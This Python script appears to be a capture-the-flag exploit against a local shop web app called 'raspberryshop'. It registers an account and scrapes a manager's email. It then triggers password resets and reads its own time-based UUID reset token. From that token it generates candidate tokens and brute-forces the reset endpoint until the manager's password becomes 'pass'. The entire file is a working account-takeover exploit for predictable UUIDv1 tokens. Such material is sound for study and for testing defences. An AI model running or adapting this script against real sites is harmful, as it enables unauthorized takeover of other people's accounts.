import requests
import time
import datetime
import guid_reaper
import re

URL = 'http://localhost:8080'
# colors
RED = "\033[1;31m"
GREEN = "\033[1;32m"
YELLOW = "\033[0;33m"
BLUE = "\033[1;34m"
BOLD = "\033[1m"
CYAN = "\033[1;36m"
END = "\033[0m"

# 1. Register a new user
def register():
    burp0_url = URL+"/register"
    burp0_data = {"email": "a@a.com", "password": "a", "passwordConfirmation": "a"}
    requests.post(burp0_url, data=burp0_data)

    burp0_url = URL+"/mail/register"
    burp0_data = {"email": "a@a.com", "password": "a", "passwordConfirmation": "a"}
    requests.post(burp0_url, data=burp0_data)

# 2. Get manager's email
def get_managers_email():
    s = requests.Session()
    r = s.post(URL+"/login", data={"email": "a@a.com", "password": "a"})
    managerEmail = re.search(r'manager-.*@raspberryshop.com', r.text)[0]
    print(f"{CYAN}> Manager's email: {managerEmail}{END}")
    return managerEmail

# 3. Send password reset requests for user and manager
def send_reset_requests():
    e1='a@a.com'
    burp0_url = URL+"/reset-password"
    burp0_data = {"email": f"{e1}"}
    r1=requests.post(burp0_url, data=burp0_data)
    
    time.sleep(2)

    manager = get_managers_email()
    burp0_url = URL+"/reset-password"
    burp0_data = {"email": f"{manager}"}
    r2=requests.post(burp0_url, data=burp0_data)

# 4. Get user token
def get_user_token():
    s = requests.Session()
    r = s.post(URL+"/mail/login", data={"email": "a@a.com", "password": "a"})
    token_pattern = re.compile(r'token=([a-f0-9-]+)')
    token = token_pattern.findall(r.text)[0]
    print(f"{CYAN}> User token: {token}{END}")
    return token

# 5. Generate list of possible UUIDs
def gen_list(uid,expectedTime):
    with open('UUID-list.txt','w') as f:
        for u in guid_reaper.gen_guids(uid, expectedTime):
	        f.write(str(u)+"\n")

# 6. Exploit
def exploit(originalUID):
    with open('UUID-list.txt','r') as f :
         uuids = f.readlines()
    for uid in uuids:
        if uid.strip() != originalUID.strip():
            burp0_url = f"{URL}/reset-password?token="+uid.strip()
            burp0_data = {"password": "pass", "password2": "pass"}
            r = requests.post(burp0_url, data=burp0_data)
            if "successful" in r.text:
                print(f"\t{GREEN}{BOLD}Password reset successful\n\tNew password: pass\n\tUUID: {uid.strip()}{END}")
                break

if __name__ == "__main__":   
    print(YELLOW+"> Registering new user"+END)
    register()

    print(YELLOW+"> Sending password reset requests"+END)
    send_reset_requests()

    uid = get_user_token()
    print(YELLOW+"> Dumping GUID"+END)
    guid_reaper.dump_guid(uid)
    expectedTime = input(BLUE+"\tEnter expected time for UUID you want to guess (Format: YYYY-MM-DD HH:MM:SS) using this script 2+ seconds: "+END)
    expectedTime = datetime.datetime.strptime(expectedTime, "%Y-%m-%d %H:%M:%S")

    print(YELLOW+"> Generating list of possible UUIDs (UUID-list.txt)"+END)
    gen_list(uid,expectedTime)

    print(YELLOW+"> Ateempting to reset admin's password"+END)
    exploit(uid)
    
    # time.sleep(1)

    # e2='b@b.com'
    # burp0_url = "http://localhost:1337/reset-password"
    # burp0_data = {"email": f"{e2}"}
    # r3=requests.post(burp0_url, data=burp0_data)

# def get_timestamp(token):
#     return int(token[15:18]+token[9:13]+token[0:8],16)

# def timestamp_to_epoch(timestamp):
#     return datetime.datetime.fromtimestamp((timestamp-122192928000000000)/10**7)
